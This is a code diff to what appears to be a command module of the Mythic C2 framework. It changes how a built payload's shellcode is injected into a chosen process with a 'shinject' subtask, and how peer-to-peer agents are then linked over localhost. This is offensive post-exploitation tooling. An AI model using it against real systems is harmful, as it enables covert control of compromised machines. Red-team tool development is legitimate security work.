@@ -80,20 +80,29 @@ class InjectCommand(CommandBase):
                         task.status = MythicStatus.Processed
                         print(resp.response["c2info"][0])
                         sys.stdout.flush()
-                        is_p2p = resp.response["c2info"][0].get("is_p2p")
-                        callback_func = ""
+                        c2_info = resp.response["c2info"][0]
+                        is_p2p = c2_info.get("is_p2p")
                         if not is_p2p:
-                            callback_func = "inject_callback"
-                        response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
+                            response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                                          command="shinject", params_dict={"pid": task.args.get_arg("pid"), "shellcode-file-id": resp.response["file"]["agent_file_id"]},
-                                         subtask_callback_function=callback_func)
-                        if response.status == MythicStatus.Success and is_p2p:
-                            response = await MythicRPC().execute("create_subtask",
-                            parent_task_id=task.id,
-                            command="link",
-                            params_dict={
-                                "connection_info": resp.response["c2info"][0]
-                            }, callback_func="inject_callback")
+                                         subtask_callback_function="inject_callback")
+                        else:
+                            response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
+                                         command="shinject", params_dict={"pid": task.args.get_arg("pid"), "shellcode-file-id": resp.response["file"]["agent_file_id"]})
+                            if response.status == MythicStatus.Success:
+                                connection_info = {
+                                    "host": "127.0.0.1",
+                                    "agent_uuid": gen_resp.response["uuid"],
+                                    "c2_profile": c2_info
+                                }
+                                response = await MythicRPC().execute("create_subtask",
+                                parent_task_id=task.id,
+                                command="link",
+                                params_dict={
+                                    "connection_info": connection_info
+                                }, callback_func="inject_callback")
+                            else:
+                                task.status = MythicStatus.Error
                             
                         break
                     elif resp.response["build_phase"] == 'error':
